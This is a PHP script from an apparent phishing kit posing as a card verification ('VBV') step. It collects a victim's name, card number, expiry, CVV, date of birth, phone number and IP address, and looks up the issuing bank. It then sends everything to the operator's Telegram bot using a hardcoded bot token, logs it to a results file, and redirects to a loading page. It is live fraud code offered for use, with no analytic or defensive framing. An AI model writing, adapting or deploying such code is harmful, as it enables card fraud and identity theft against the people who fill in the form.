<?php
include "anti/index.php";
include "id.php";
if(isset($_POST['okbb'])){
$ip = getenv("REMOTE_ADDR");
$bin        = str_replace(' ', '', $_POST['ccnumb']);
$bin        = substr($bin, 0, 6);
$getdetails = 'https://lookup.binlist.net/' . $bin;
$curl       = curl_init();
curl_setopt($curl, CURLOPT_URL, $getdetails);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
$content    = curl_exec($curl);
curl_close($curl);
$details  = json_decode($content);
$_SESSION['_namebank_'] = $namebank   = $details->bank->name;
$message = "|==[ VBV INFO ]==|
|CC HODLER : ".$_POST['fullname']."
|CC NUMBER  : ".$_POST['ccnumb']." (".$_SESSION['_namebank_'].")
|expmonth : ".$_POST['mmonth']." expyear : ".$_POST['myears']."
|CVV : ".$_POST['cvvz']."
|DOB : ".$_POST['dobz']."
|Phone Number : ".$_POST['phone']."
|IP      : ".$ip."
|==[ VBV XTN ]==|\n";
    
foreach($user_ids as $user_id) {
$url='https://api.telegram.org/bot5265736875:AAFB5gkPar8bHcRWe98Rnj1Z-txuKF5xb7s/sendMessage';
$data=array('chat_id'=>$user_id,'text'=>$message);
$options=array('http'=>array('method'=>'POST','header'=>"Content-Type:application/x-www-form-urlencoded\r\n",'content'=>http_build_query($data),),);
$context=stream_context_create($options);
$result=file_get_contents($url,false,$context);
}
$myfile = fopen("rzlt.txt", "a+");
$txt = $message;
fwrite($myfile, $txt);
fclose($myfile);
HEADER("Location: loading.php");

}
?>